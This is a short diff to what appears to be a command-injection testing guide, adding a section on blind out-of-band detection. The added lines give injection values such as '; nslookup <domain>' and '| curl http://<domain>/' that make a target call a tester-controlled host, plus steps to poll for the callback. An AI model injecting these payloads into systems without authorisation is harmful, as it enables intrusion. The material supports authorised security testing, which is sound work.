@@ -135,6 +135,16 @@ value (10 s) while all other response characteristics remain identical.
   - Apply an allowlist to restrict the parameter to expected characters
     (e.g., IP address or hostname pattern) as a defense-in-depth measure.
 
+## Blind detection (OOB)
+
+When neither output nor timing gives a signal, use the OOB receiver:
+
+1. `oob_get_payload` → note the `domain`.
+2. Inject `; nslookup <domain>` (or `& nslookup <domain>` / `| curl http://<domain>/` per OS).
+3. Send the request.
+4. `oob_poll since_id=0` — a `dns` interaction from the target's egress IP
+   confirms blind command execution.
+
 ## References
 
 - OWASP WSTG INPV-12 — Testing for Command Injection:
